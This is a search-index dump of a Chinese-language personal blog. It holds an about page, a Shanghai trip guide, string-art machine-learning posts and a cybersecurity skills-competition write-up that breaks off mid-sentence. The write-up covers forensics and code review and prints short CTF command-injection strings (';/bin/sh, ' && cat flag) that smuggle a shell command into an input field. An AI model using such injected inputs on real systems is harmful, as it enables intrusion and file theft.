[{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/posts/","section":"Blog Posts","summary":"","title":"Blog Posts","type":"posts"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/series/%E4%B8%8A%E6%B5%B7%E7%95%A2%E6%A5%AD%E6%97%85%E8%A1%8C/","section":"Series","summary":"","title":"上海畢業旅行","type":"series"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/tags/%E6%97%85%E8%A1%8C/","section":"Tags","summary":"","title":"旅行","type":"tags"},{"content":"歡迎來到這個小世界，我是 Luke，常用的 ID 除了 Luke 還有 April Aries 或它的簡寫 AA，因為我是一隻四月誕生的牡羊，四年前進資工系覺得大家都有自己的 ID 很酷，但要自己想卻想不到第一時間就適合且喜歡的，所以 AA 就一直使用到現在了\n目前是準國立陽明交通大學資訊安全研究所學生，剛從國立臺灣師範大學資訊工程學系畢業，曾經修習半個教育學程和 PASSION 偏鄉優質教育學分學程，主要研究領域在資訊安全，對滲透感興趣但什麼都打不下來\n這個網站會放上一些個人生活紀錄或競賽解題筆記。歡迎對我、對資安、對教育有興趣的人類們偶爾來看看\n學歷 # 國立陽明交通大學 資訊安全研究所 碩士 2025.09 - NOW 國立臺灣師範大學 學士 2021.09 - 2025.06 國立中央大學附屬中壢高級中學 高中 2018.09 - 2021.06 工作經歷 # 叡揚資訊股份有限公司 資安直屬事業處 實習生 2024.07 - 2024.12 教育經歷 # 113-2 資安攻防演練 助教 助教 2025.03 - 2025.06 113-2 程式設計（二） 助教 助教 2025.03 - 2025.06 遠距實習教師：花蓮縣立富里國中 [英文] PASSION 2025.03 - 2025.05 遠距實習教師：花蓮縣立萬榮國中 [數學] PASSION 2024.09 - 2024.12 暑期實習教師：花蓮縣立東里國中 [閱讀、數學] PASSION 2023.07 高中數學家教 家教 2023.03 - 2025.07 數位學伴：臺中市東汴國小 [數學] 數位學伴 2023.03 - 2023.06 獲優良大學伴 證照 # IPAS 初級資安工程師 IPAS 2025.01 分享 # 壢中小大學 校友分享 資工 2025.05.28 理學院實習成果發表會 實習 2024.11.21 暑期企業實習成果分享會 實習 2024.09.16 ","date":"2025-07-06","externalUrl":null,"permalink":"/about/","section":"About Me","summary":"","title":"About Me","type":"about"},{"content":"","date":"2025-07-06","externalUrl":null,"permalink":"/","section":"Luke's Blog","summary":"","title":"Luke's Blog","type":"page"},{"content":"看了 Sky 的個人網站，覺得 now 頁面的概念滿酷的，所以也仿照做一個\n20250706 網站搬遷中 # 網站搬遷中，目前 categories 頁面怪怪的，我會盡快修好！ ","date":"2025-07-06","externalUrl":null,"permalink":"/now/","section":"Now","summary":"","title":"Now","type":"now"},{"content":" 緣起 # 在沒有人邀約之前，或許我的大學畢旅會是暑假自己規劃個三天左右的獨旅，但在 Jo 的一個提議後，這趟旅程逐漸成形\n整趟旅程源自於這段對話 我們是高中社團的戰友，分別是副社、教學長和社長秘書，原本想要邀請比較熟識的社長大大和機動一起參加，可惜大家都有自己的規劃，於是這趟旅程就只有我們三個了，二女一男\n其實行前我一直思考該怎麼對這趟旅程下標，歐哈拉之旅、司法島拯救 bing 姐大作戰（好 \u0026hellip; 太中二了，但懂得都懂），但考量到這趟旅程集結了許多我的第一次，還是決定以 My First ShangHai 作為自己定義的旅程 title\n這是我第一次出國、第一次搭飛機、第一次踏入上海這趟土地、也因此第一次拿到護照、第一次辦台胞證、第一次開通行動郵局、第一次使用行動支付功能，很謝謝 Jo 整趟旅程對所有細節的叮嚀，還有 bing 姐這個稱職地陪\n準備 # D-0 來談談行前準備。我跟 Jo 和 bing 姐花了三四次的討論讓整趟旅程成形，這邊要先大力感謝 Jo 豐富的經驗帶領我這個初飛者從 0 到可以飛出國\n初飛去上海的好處應該就是生活、文化、語言等都很相近，加上上海市很發達的地區，不用特別擔心治安、衛生或其他不習慣的問題，飛行距離也很近，以初飛來說是滿適合的，剛好也有合到我對初飛的想像：不是日韓就是中國。但就缺點來說應該就是需要多申請台胞證吧！下面就來簡單談談行前準備\n關於護照 # 因為我是第一次出國，所以護照還需要另外申請，但因為護照跑戶政事務所就好，其實滿方便的，但光是護照就需要兩個禮拜左右，時間上要注意一下（拿 1300 買一個出境資格，這樣不出國都覺得浪費了）\n關於台胞證 # 護照完下一個是台胞證，台胞證需要找臺灣的旅行社辦，網路上其實可以找到很多，但價位並不一樣，相同的是都會比護照貴就是了，我找的是相對便宜的新中旅快簽，桃園在火車站附近，昊德樓上而已，因為他還提供免費拍照（據說護照和台胞證照片要不一樣，但櫃檯姐姐跟我說我新申請護照所以可以？），而且不用把護照收走，又滿方便可以到店，不過台胞證以 1500 的價位需要七個工作天，注意七個工作天不等於一個禮拜，遇到假日時間會順延，當然可以加價提早拿到，但我不要！\n關於網卡 # 台胞證完下一個處理的是網卡，這就是去上海的缺點了，去中國的網卡需要考慮能不能翻牆，如果找原電信公司，那倒沒什麼問題，畢竟電信公司如果還處理不好的話有愧於他是電信公司這項事實，但通常都要找去中國的網卡了，會賣得還沒考慮到這點也滿奇怪的。我是選擇辦理台胞證那間新中旅快簽，他們提供五天 499 的價錢，一天 3G，根據之前寒暑假整天抱手機的經驗，誇張一點一天也才 2G 左右，3G 是綽綽有餘，但保險一點我還是選擇多一些。中華電信也有提供那種海量型 10 天 15G，不過價錢稍微高個 100 左右，新中旅的方法是直接給一張 SIM 卡，到當地再插進去就好\n這邊偷偷抱怨一下，個人覺得新中旅是可以選擇的，不過服務態度不是很好，就是冷冷的跟你講話，覺得很多事情都應該了解，總之去兩趟都覺得沒有很舒服，尤其買網卡那次先跟我收錢就沒了，我還想說 SIM 卡式打算寄給我還是怎樣，結果是他忘記拿\u0026hellip;\n關於行動支付 # 比較重要的是支付，在中國沒有支付寶或微信支付會比較麻煩，畢竟行動支付再拿邊已經是主流了。不過我之前是完全沒使用過 * PAY 功能，為了這次還新開通 VISA 卡，綁定一大堆沒用過的功能，滿有趣的\n支付寶和微信支付其實差異不大，在那邊就是兩個不同派系而已，但走到哪裡都能使用，我們雖然使用支付寶，但微信或許會是更好的選擇，因為微信也是他們主流軟訊軟體，有點像 LINE 和 LINE PAY 的關係，不過初次使用微信的要注意幾件事情，一個是微信重載、換手機等都會讓紀錄不見，而且登入會要求兩個階段（我很喜歡但有點麻煩），第一次申請應該需要一個有在用微信而且開通微信支付三個月以上的人幫忙驗證，如果是臨時要用會很麻煩\n支付寶一開始一定要中國那邊的銀行卡才能綁定，是這幾年才有開放支援 VISA 卡的。而臺灣這邊也有支付寶，但限境外人士使用\n支付寶使用上有幾個要注意的地方，打開 app 上面有幾個按鈕是會用到的，一個是掃一掃，拿來掃店家的 QR code 並輸入金額，使用這個記得 NFC 要打開，我第一次在耍笨難怪店家的「碰一碰」沒用，另一個是境外支付，那是店家掃我的時候用的，第三個很重要，是境外出行，要先把所在的地方（比如上海）的付款碼打開，包含地鐵和公車\n關於 Apps # App 的部分除了微信、支付寶以外，我還有載高德地圖，使用 Google Map 的資訊還真的沒那麼仔細，高德可以看到比較詳細的內容，包含店家評價、菜單之類的，很可愛的是高德會在路上畫車輛，塞車的時候會在圖上表示出來。其實高德地圖和百度地圖應該也是不同派系而已，使用上還是差不多的\n攜程是他們綜合很多食衣住行育樂的 app，如果是購票、找資訊可以在上面滑滑看；大眾點評試著使用過，但要求中國手機號碼，所以不能用；美團是外賣，但沒用過不知道如何，不過美團就像我們這邊的 Uber Eat 或 Food Panda，當地人使用頻率很高\n最後以這趟旅程來說，會用到的就是迪士尼的 app，載這個主要就是當地圖和看排隊時間，有去迪士尼真的需要載下來\n","date":"2025-07-06","externalUrl":null,"permalink":"/posts/myfirstshanghai-d0/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 0 說說準備期","title":"上海畢業旅行 - Day 0","type":"posts"},{"content":" 緣起 # 如果對於這份計劃感興趣，可以參考透過 Autoencoder 產生弦藝術 這篇文章，裡面有提及較多弦藝術的基礎想法，當時產生的結果並不好，因此在類神經網路第三次專題時，我和 David 提出了 string art revenge 的計畫，打算再花一段時間研究，提交出更好的結果，加上這堂課的指導老師人非常好，從 project 2 開始過程中不斷與我們討論，也想要在期末給他看到成功的案例\n如果你也想看到成功的 string art image，那很抱歉，我先說明結論，這份專題並未讓我們找到成功的解法，但嘗試了不同方式，也提出了許多可調整的地方\n方法的選擇 # 在 project 2 我使用了 autoencoder 模型，因為整體架構和 string art generation 有異曲同工之妙，但在實驗後才逐漸發現我好像一直把 decoder 忽視，所產生的 loss 也只是為了做 back propagation 而存在，這讓我在這次專題中想要將 decoder 直接從架構中移除，我想單純訓練一個 decoder，這個 decoder 就是一個神經網路，輸入一張圖片，可以輸出一段 pin pair connections\n這就是 project 3 的起始想法，簡單訓練一個 CNN 模型，調整它的參數看能不能真的產生弦藝術圖片，但實作後才發現在類神經網路的架構中，幾乎都是靠著反向傳遞 (back propagation) 做到，想做到 back propagation，loss 的計算中就必須要有 gradient 存在，以弦藝術專題為例，loss 的計算是透過兩張圖片，一張 target image 和一張 string art image，如果產生的 string art image 具有 gradient，那就可以簡單地進行 loss 計算並反向傳遞調整神經網路的參數，但因為在設計上，string art image 並不是由神經網路產生，圖片並不包含 gradient 資訊，導致這種設計沒辦法進行 back propagation，也沒辦法拿來訓練神經網路\n上述提到這種問題在和老師討論後才打開類神經網路課題中異世界的大門：reinforcement learning，中文翻作增強式學習，正是解決上述問題的好方法\n所謂增強式學習由兩個角色構成：actor 和 environment，actor 的行為 action 會對 environment 造成影響，environment 會根據 action 給予回饋 reward，actor 會透過觀察 observation 和獲得的回饋 reward 決定下一輪行為 action，最終目標是在回合結束前（達到終止條件前）獲得最高的 return，也就是 total reward。RL 的概念很常聽到，但一直沒有深入了解，這次也算是半強迫我搞懂 RL 的基礎了，有興趣完全推薦臺大李宏毅老師的 YT 影片 ，總共有五部曲，會透過很淺顯易懂的方法了解基本 RL 知識\nReinforcement Learning 的方法 # 這個章節簡單介紹整個 project 的設計，會分成參數設計、資料集、environment、actor 以及 training loop 進行說明\n參數設計 # 這邊想要提及的是 string art 本身的設計，我們使用 250 條線段在 500 * 500 的 canvas 上進行繪製，canvas 周圍還是放置了 288 個 pins 作為線段起終點\n一樣的問題是 string art 本身的設計還是在解析度非常小的情況下進行實驗，500 * 500 的解析度是礙於 Google Colab 的記憶體限制，而之前透過線上工具慧智賢藝術圖片發現採用約 3000 - 4000 的線條下可以比較完整的呈現目標圖片的結構與細節，但在 500 * 500 的解析度下繪製這麼多條線幾乎會讓整張 canvas 被直線覆蓋，完全無法呈現目標圖片的長相，實驗下差不多 250 條直線才有機會在 canva 產生變化性的圖片，因此這次專題使用了 250 條直線進行繪製\n資料集 # 資料集使用 Kaggle 上的 Human Face Dataset ，裡面約有 7000 多張人臉，使用前我們都會將其轉換為 500 * 500 大小的灰階人臉才餵進去訓練模型\n預期上是希望可以將每張圖片都看過一次作為完整的 training loop，不過礙於時間成本，這次專題的 training loop 只有看過前面 1000 張圖片而已\nenvironment # 環境設計包含幾個要素：state space, actor space, reward function 以及 episode termination\nState space：當前狀態的 canvas。以一個連續陣列表示，每個元素的值在 0-255 之間表示 RGB 顏色，不過實際上用到的只有 0 或 255 而已 Action space：可以選擇的行為。每次行為皆會從所有 288 個 pins 中選擇兩個 pins 表示要連接畫線的端點，pin 的值介於 0-287 Reward function：獎勵回饋機我們我們設計了三個獎勵機制，至於如何使用會在實驗章節說明 Initial improvement：計算空白 canvas 與 target image 的 MSE loss 與當前 canvas 與 target image 的 MSE loss，兩個 loss 相減即為 initial improvement Latest improvement：計算前一輪 canvas 與 target image 的 MSE loss 與當前 canvas 與 target image 的 MSE loss，兩個 loss 相減即為 latest improvement Penalty：當 actor 選擇到相同直線時就給予 -0.1 分的處罰，希望藉由小處罰讓 actor 知道不要重複選擇相同的線段 Episode termination：我們定義完成一張 string art image 即為完成一個 episode，也就是當 actor 採取 250 次 action、canvas 上畫過 250 次直線時，就讓 training loop 進到下一個 episode 環境是採用 OpenAI 的 Gym environment，不過因為我們的並不是內建存的遊戲或已經有人設計過的環境，所以需要進行客製化設計，在 OpenAI 的定義裡會需要四個 functions：init, reset, step, render\ninit：初始化需要的東西，包含參數、畫布等等 reset：進入新的 episode 之前的重置步驟，包含清空畫布與參數的重設 step：每一次 action 後的更新，例如根據 actor 畫線、計算 reward、更新畫布等等 render：在有需要的時候將畫布渲染出來 actor # Actor 是個三層的多層感知器 (MLP)，input 是一個 500 * 500 的 canvas，actor 會根據 canvas、target image 與 reward 進行調整並 output 選擇到每個 pins 的 probability，我們會從中選擇最高分的 10 個 pins 作為候選人，在新增 Gaussian noise 之後 sample 出兩個 pins 作為 action 繪製下一條線\ntraining loop # 實驗 # 實驗 1. # 實驗 2. # 實驗 3. # 結論 # Contribution # 未來研究方向 # 心得 # 說實話 RL 對我而言是個全新的東西，為了口頭發表甚至在一天內把李宏毅老師的 RL 影片肝完理解了最基礎的概念後套到這個專題，到現在或許我也沒有理解的很透徹，比如說 PPO 那一塊到現在就是一知半解，這次專題有用到但卻不是這麼的了解，感覺就是下次可以花時間研究的方向了\n還是推薦歡迎對這個專題有興趣的讀者來跟我一起討論，未來應該會在有時間有硬體設備的情況下繼續摸這個專題，我是真的想弄出成果的，畢竟耗費了類神經網路兩次專題的時間在這上面都沒成效，有點對不起老師，對我來說也超級可惜的\n最後，Claude 真的很讚，100 分推薦！\n","date":"2025-06-14","externalUrl":null,"permalink":"/posts/string-art-generation-using-rl/","section":"Blog Posts","summary":"","title":"透過 Reinforcement Learning 產生弦藝術","type":"posts"},{"content":" 弦藝術 String Art Image # 弦藝術又被稱作 string art 或 thread art，是透過一條一條的線段組成的一幅畫，首先會有一個圓盤 (canva)，接著在圓盤周圍可以釘上幾個 pins，在 pin 和 pin 之間拉線 (pin-pair connections)，就會形成一幅肉眼可辨識的畫\n我從《我獨自升級》這部動漫中找了最經典的石像臉作為範例，並透過這個網站 畫出 string art image，string art image 在開始製作前會有預處理的步驟，也就是將圖片轉成灰階，並設定成特定尺寸。接著會開始在 pin 和 pin 之間拉線，如下圖，在經過 1000 條線之後，產生的 string art image 基本上可以粗略看到輪廓，但說要辨識出更詳細的資訊還有點困難，因此我再畫上 1000 條線，2000 條線的結果可以明確知道眼睛、鼻子和嘴巴，甚至牙齒的位置，臉型也有一點出來，到了 3000 條線，其實已經滿完美的了，很明確可以知道這就是 solo leveling 石像的臉，最後到了 4000 條線，可以更清楚的看見原本石像的紋路，雖然 4000 條線下顏色有點深，但更具立體感，這就是 string art image。\n根據實驗，這是在 canva 設為 1024 * 1024，圓周放上 288 個 pins的結果，可以猜測出來 string art image 在 canva 尺寸、pins 數量、線條數量改變的時候會有不同的效果，甚至可以調整線條粗細和顏色達到彩色的 string art image。\n所以 string art image 的問題其實就是給予一張原始圖片，要透過某個神奇的方法產生一張 string art image，當然有人針對這個問題進行研究過，第一個方法肯定是 brute force，但可以猜測到這非常沒有效率，所以後續有人針對數學性質、貪婪演算法或其他啟發式演算法，如基因演算法為主進行研究，嘗試有效率的產生 string art image。\n而這個問題其實也可以看成我要尋找一個函數，這個函數 input 一張原始圖片，我要 output 出 string art image，或簡單一點，我要找出 pin-pair connections 就好，那找函數正是 machine learning 在做的，但目前確實沒什麼人透過 machine learning 進行這方面的研究，因此我趁這次專題透過 autoencoder 尋找 string art image 這個問題需要的函數。\n實驗設計 # Autoencoder 的 model 會對 encoder 餵入訓練資料，產生一段 latent code，latent code 經過 decoder 會盡可能的產出類似原訓練資料的結果，這個流程其實很像 string art image 的產生過程：給予一張原始圖片，經過 encoder 產生一段 pin pairs connection，pin pairs connection 經過 decoder 要產生 string art image，且越接近原圖片越好。\n接著來細看我的實驗設計，input image 原本想要人臉，但因為人臉解析度比較高，訓練資料太大，所以換成 kaggle 上的 anime face dataset ，這個 dataset 有將近 21000 筆資料，每張 anime face 都被 resize 成 64 * 64；encoder 是一個 3 層的 CNN model，最後會產生一個 1 * 2000 的 latent code，這個 code 表示 string art image 上 1000 條線的連接關係，每兩個數值表示 canva 上的兩個 pin，彼此之間會拉起一條線。\n接著我會拿 latent code 丟到 decoder 裡面，decoder 是一個和 encoder 對稱的 3 層 CNN 模型，最後產生的結果並不會是 string art image，而是一張接近但不相同的圖片，就像一般 autoencoder 在做訓練時產生的東西一樣。所以我會同時拿 latent code 丟到一個既有的演算法中，這個演算法做的事情就是拿這些 pin pair connection 產出一張 string art image。\n接著是最核心的地方，我要怎麼衡量模型的好壞？當然和一般 autoencoder model 一樣拿 decoder output 和原圖做比較，我透過 MSE loss 去進行衡量，起初按照這樣的結果會發現 loss 從一開始就維持差不多 0.47，沒有特別上升或下降的幅度，就好像完全沒在訓練一樣，但仔細觀察這一步其實很奇怪，因為我根本不在意 decoder 的 output 長什麼樣子，反而是在乎 latent code 產生的 string art image，所以第二次實驗我同時考慮了 string art image，並透過 L1 loss 進行衡量，因為要求 string art image 和原圖長一樣是很過分的，比起每個 pixel 的衡量，應該更著重 圖片 structure 的相似度，衡量方法就是很簡單地把兩個 loss 加起來。\n實驗結果 # 圖顯示 epoch = 10, 20, 30 以及 40 的情況，loss 標註在旁邊，可以很清楚的看到根本分辨不出來這是什麼，但在前 40 個 epochs 的 loss 變化雖然一直往下，但幅度非常的小，整體來說結果並不是很好\n我簡單分析了幾個可能的原因\n可能和 input dataset 有關，畢竟原圖只有 64 * 64 的解析度，在產生 string art image 的時候，因為更難解析原圖的結構，所以不容易產生好的 pin pairs connection，但這是訓練過程應該學到的事情，應該不是主要問題 output string art image 的尺寸也是一個原因，為了讓模型能持續跑在 google colab 上，我將 size 設為 512 * 512，pins 數設為 288，線條粗細調整到最細，但在這張 canva 上畫了 1000 條線很有可能讓整張圖片都變成全黑的，那在判斷 loss 的時候，確實就沒什麼好判斷的，就像全黑的圖和原圖做比較，每次比出來的結果都是一樣的，至於為什麼我不增加 output string art image size，因為如果增加這個模型跑到一半就會噴 running out of RAM 並停止，算是硬體設備上的不足 僅使用 1000 條線在最前面介紹 string art image 的時候有提到並無法好好呈現原圖的長相，也有可能是因為這個緣故，讓衡量圖片好壞時效果不彰。 最後當然就是訓練期間太短，前一頁顯示的結果到 40 個 epochs，這個訓練期間差不多需要 8 個小時，但因為 loss 下降幅度並不高，當時就停止了，如果訓練期間在拉長應該也能看到稍微好一些的結果，但我不認為這是主要原因 總而言之，會造成實驗失敗的主因應該會是第二項與第三項\n結論 # 這份專題的貢獻當然是前衛的提出透過機器學習的角度解決 string art image，但不幸失敗收場。或許這也可以反思為什麼沒人要透過機器學習解決這類問題，如果數論或其他貪婪演算法就能有效的解決，且維持不錯的品質，那訓練一個模型，可能因為圖片不再是人臉，換成風景圖，或其他因素導致使用模型的 target 不適合，產出結果不會像現存的解決方案這麼好，可能不是這麼划算的解決方案。\n未來研究方向的部分，一個當然是提升硬體設備，在足夠的算力與時間成本下，進行完整的訓練，並將 input 與 output image 的解析度調高，讓 loss evaluation 可以正確比較，第二個就是嘗試不同模型，這次雖然使用 autoencoder，但可以從整體架構，或是撤換 encoder 或 decoder 的模型、調整參數來實驗，最後就是 loss function 的使用，不僅僅是替換 MSE 和 L1 loss，也可以調整兩者之間的比例，例如將 string art 的 loss 給予 7 成的權重，而 decoder output 給予 3 成，來更著重 string art image 的成果\n","date":"2025-05-03","externalUrl":null,"permalink":"/posts/string-art-generation-using-autoencoder/","section":"Blog Posts","summary":"","title":"透過 autoencoder 模型產生弦藝術","type":"posts"},{"content":"","date":"2025-04-23","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":" 緣起 # 一切是從上學期第二堂高等資安攻防演練講師：前國手 Mico 大力宣傳，種下了技能競賽的種子，某種程度上這也算是一個資安屆的殿堂，就算沒坐在高位，曾經進到裡面也一定有收穫\n第二次接觸是去年 (2024) 看到的大消息：海豹成為第 47 屆網路安全國際技能競賽銅牌得主，再一次接觸到技能競賽的名詞\n第三次就是參加 2024 HITCON CTF 暨菁英人才交流活動，又遇到 Mico 給他安麗了一下\n第四次就是看到報名消息，毅然決然決定組隊報名，於是展開了一段我獨自升級的旅程（啊不過是兩個人）\n0327 Day1 淘汰賽 # 規定是說北區超過 18 組就要進行淘汰賽，北區這次有 22 組選手報名，所以會在第一天就先進行淘汰賽篩選掉來體驗的 4 組選手\n淘汰賽採紙本進行，40 道單選題，一題 2.5 分，答錯倒扣 0.5，同分以先繳交者獲勝，賽前我們很認真地計算過了，假設題目超級難，那每題答對的機率是 1/4，在每題都寫的情況下得分期望值為 2.5 * 10 + (-0.5) * 30 = 10 分，成績 range 就是 -20（來亂的） 到 100\n淘汰賽考什麼？滿出乎意料的是範圍很雜，原本以為主辦方會想從淘汰賽測試選手的資訊概論能力，包含網路概念：TCP/IP Model、protocols 或硬體層面的作業系統、記憶體等等，實際上面相滿廣的，簡單的比如說「有人正在學習程式設計，迴圈的關鍵字可能是下面哪一個？」（答案為 for）、或是「在 Linux 中如果想查看網路設備，應該用什麼指令」（答案為 ip），這些都能一眼寫出答案，中等的比如說「在 Linux 中想查看某支 process 的記憶體 dump，應該去哪裡找」（答案為 /proc/[PID]/mem）、或是「下列哪個不是 Windows Active Directory 工具之一」，這種可能就沒有那麼常見，甚至沒用過，但多少猜得出來，再難一點就是一些 Windows 的資安工具，比如說在 Windows 中檢索操作 Windows 作業系統中身分驗證訊息的 mimikatz、提權工具 juicy potato 等等\n可以分享一個滿蠢的情境，題目問「如果我想要列出某個程式連結的動態函式庫，要用哪一個 Linux 指令」，選項大概就是 dll, ddl, ldd, lld，第一個刪掉的是 dll 啦！畢竟那是 Windows 動態連結函式庫名稱 (dynamic link library)，ddl 也不可能，至少沒什麼看過她出現在 command 裡面（回來查之後才發現是 data definition language，跟資料庫有關），ldd 和 lld 就真的卡很久，怎麼唸感覺都很順，不過靠接觸 Linux 三四年的直覺還是猜對了，答案是 ldd，全名為 list dynamic dependencies，如果考試時間再長一點，給我繼續唸我可能會覺得 lld 是對的，什麼 linked library dynamic 好像很合理\n很幸運的我們有從淘汰賽中存活，倒也不是不相信我們會活著，只是很怕就這樣止步真的沒辦法跟 Neokent 交代就是了\n0328 Day2 分區正式賽 # 分區賽跟往年差不多，早上三小時的安全強化 20 分、數位鑑識（將近） 40 分，下午 CTF 40 分，主要 focus 在 pwn, reverse 和 web，不過鑑識那邊多了一個遊戲是 code review，是往年不曾見過的\n安全強化 # 這是最初我覺得要全拿的部分，但寫完歷屆覺得現場應該只能完成六七成左右\n進到正式賽就先來一個不可思議，題目設計了一個平台，四題 Windows 四題 Linux，可以透過測試知道目前安全性問題，如果 patch 掉就能拿到 flag，目標就是拿到八個 flag 賺這 20 分\nWindows 第一題是密碼長度最小值設定，按照過往經驗就是 WIN+R 輸入 gpedit.msc 打開群組政策編輯器，找到安全性原則改一改就好，但很嚴重的問題是這是本機端啊！題目要改的是域密碼策略，也就是從 AD 去改，現場找了很多 AD 的設定，似乎有找到，但不知道怎麼編輯，於是這題的 flag 就留在平台裡了。不過這邊還是放上解答，可以參考Microsoft 的教學文件：為 Active Directory Domain Services 設定更細緻的密碼原則 第二題是域控制器使用了 SMB 1.0，有安全性風險，想要我們處理，解法很直覺就是找到設定 SMB 1.0 的設定看要移除還是調高版本就可以，但這題一樣因為找不到設定的地方所以 flag 也留在平台裡。一樣留個官方解答：在 Windows 中偵測、啟用和停用 SMBv1、SMBv2 和 SMBv3 第三題是有一位 testuser 不符合安全性策略，滿好笑的是 Ray 從 domain administrator 中找到他移除就結束了，安全強化 += 2.5\n第四題則是防火牆，要求遠端桌面只能存取特定 IP range 的連線，那就打開防火牆輸入規則中用戶遠端桌面連線的規則設定這一條就可以了，安全強化 += 2.5\n接下來是 Linux，出乎意料的是 Linux 考題出在 WSL 上面\n第一題屬實有嚇到我，先考了 ssh 的問題，倒不是不知道 ssh，只是覺得在沒有任何資源的情況下不確定能否解出來，這題是說 ssh 允許了 root 連線，題目覺得這應該禁止掉，不外乎就是從 ssh 的設定檔調整，在 /etc/ssh/ssh_config 裡面找到 PermitRootLogin yes 改成 PermitRootLogin no 就拿到 flag 了，安全強化 += 2.5\n第二題是 ssh 用戶中有人不符合密碼原則，想要我把他抓出來，解法應該也是找到他 remove 掉就行，但滿可惜的是我不知道哪裡可以找到 ssh users，所以這題的 flag 就還給平台了\n第三題忘記了\n最後一題說 Linux 中有一個重要的檔案違反最小權限原則，想要我們把它的權限改為 000，其實這題比較麻煩的是不知道所謂重要的檔案是誰，在 Linux 中第一個想到的多半就 /etc/passwd 和 /etc/shadow，但 000 是不是太低是我當時在猶豫的，不過嘗試總會帶出答案，在改完 /etc/passwd 後，flag 也跟著出來，安全強化 += 2.5\n就安全強化的題目來看，跟往年的歷屆不是很雷同，但也都圍繞在很基本很重要的觀念，對於有在接觸 Windows AD 或真的處理過 Linux 設定的選手絕對不是問題\n數位鑑識 # 數位鑑識分成兩部分，一是 memory dump 的分析，另一個則是網路流量封包分析。沒有特別的分組，但主要來說 Ray 負責 memory，我開 wireshark 看封包\n記憶體鑑識 # 記憶體的部分，一樣問作業系統當作送分題、其他則是電腦名稱與當下使用者名稱、記憶體檔的惡意連線 IP、藏起來的特徵值等等\n基本上起手式已經練到一拿到記憶體檔就 python2 vol.py --file=\\PATH\\TO\\MEM\\FILE imageinfo 開下去掃（這是在本機這樣做，但比賽當下 volatility 裝在 Windows，所以是跑到解題工具那邊下 volatility.exe ...），沒意外都是 Win7，果真不出意外意外就來了，這次跑出 Win10，不太一樣沒關係，第一題作業系統 get！\n起初是覺得就版本新一點，而且 Win10 我們更熟悉，還滿開心的，尷尬的是後面題目就解不太出來，起手式第二步通常是 pslist、psscan、filescan、console、cmdscan 這些開下去跑完再作分析，據 Ray 所述 filescan 是空的、console 沒什麼有意義的東西，再去看看題目說這次主要跟連線有關，換個 connscan、connections、sockets、sockscan 等卻都沒有成功，這就是之前沒碰過的地方，volatility 噴一個「不支援 Win10 的 connection scan」，直接阻擋了我們針對連線作分析的手段，也因為這樣記憶體件事其實卡了超級久\n柳暗花明又一村的契機是我看到題目要找 user name，想到之前解用戶密碼都是 hashdump，至少可以看到哪些用戶，所以執行了一下列出可能解，Ray 在後面想到有時候裝函式庫需要自己設定環境變數，所以賭賭看有沒有檔案寫在環境變數，就可以透過檔案路徑發現 username，這個方法確實有效，能夠看到某些檔案路徑就寫著從 website 出發，可以先猜測 username 就是 website，更幸運的事其實 Windows 的環境變數裡就有紀錄 username 和 computer name 分別是什麼，成為更有利的證據。沒錯，記憶體鑑識再加一題！\n個人認為有一個很酷的是今年考了特徵，有點像是找 flag，題目說記憶體中有一個 ws54{...} 的字串，想要我們找出來，剛好翻 volatility 的 help message 時最後一個叫 yarascan，可以指名 yararule 或字串進行搜尋，才想到這或許可以拿來利用一下，滿可惜的是嫂出來包含 ws54 的字串有三組，但都沒有後續 {...} 或像 flag 的長相，這題還是以失敗告吹\n網路封包流量鑑識 # 熟悉的 wireshark 最對味，有種夢回 112-2 去台大修計網的感覺\n這個題組要我們看出這段封包在幹嘛，攻擊者 IP、受害者 domain name、攻擊者利用什麼漏洞取得主機控制權以及漏洞 URL，不要問為什麼我記這麼清楚，啊就我寫的咩！而且看封包看了好一陣子\n簡單來說，我所看到的故事是有一個攻擊者很可疑的一直戳各種可能存在的檔案，受害者機器一直回 404 Not Found，看前幾個封包可以簡單看出誰是好人誰是壞人，也可以猜到接下來攻擊者會幸運猜中一個存在的位置做接下來的攻擊，入侵、取得控制權、躍權 blablabla 的\n後續就沒有那麼明朗，有注意到眾多 404 Not Found 裡面成功的是攻擊者發送 POST request 到 photo.php，檔名看起來就很後門，答題的時候是猜攻擊者透過任意檔案上傳的漏洞上傳了一個 reverse shell 來取得主機控制權，如果是這樣那只要找到合理有利的證據就可以把封包鑑識全壘打，但同時也在懷疑這個 POST request 會不會只是在這個 php 上像是送表單的行為，所以是送出 malicious request，而 photo.php 只是受害者網站本身就存有的後門\nCode review # Code review 佔兩題，一題 3 分，這種題目不是沒寫過，高等資安攻防的時候 YinMuo 的作業就是從 Neokent 程設作業 example code 中找漏洞，當時還要寫 report，至少有寫過簡單的 PoC，這次只要簡單敘述，倒沒這麼難，只要能看出洞在哪就好\n第一題是很良心的 SQL injection，短短幾行有出現 SQL 語句基本上八九不離十，加上沒有任何 filter、prepared statement，答案就很明確了\n第二題是更良心的 buffer overflow，buffer overflow 的題目已經變成掃 pattern 了，看到 strcpy 和 gets 都會反射皺一下眉頭，因為都沒有針對長度進行過濾\n看到 buffer overflow 的時候有再想會不會想考深層一點的 format string，但這次可能是第一年出，所以沒有多繞幾個彎，大膽預測明年後年 format string 可能會列入考題\nCTF # 下午的 CTF 只有三個面向：pwn, rev 以及 web\nPwn 有兩題，基本上是超簡單的 buffer overflow\n第一題搭配 command injection，題目會先問名字 (name)，問完之後問你想說什麼 (msg)，接著把 name 結合到指令 cmd 中，透過 system() 執行 echo 印出 \u0026ldquo;Hello, {name}!\u0026rdquo; 並再透過 printf() 將 msg 印出來，很明顯因為是 system，我有很好的媒介可以拼湊指令得到 shell 的存取權。這題難在哪裡，因為指令要塞在 name 中，可能會想輸入 ';/bin/sh 這種名字，但在輸入完名字之後題目很討厭的去檢查 name 的輸入，如果遇到非小寫英文字母就說偵測到壞壞的字元結束程式，所以不能從 name 下手做壞事，那下一個媒介就是 msg 了，想要從 msg 寫到 name 就勢必得靠 buffer overflow，但接下來就是兩個碰過的問題，一是想要塞 argument 會需要空白字元（比如說 ' \u0026amp;\u0026amp; cat flag），但 scanf() 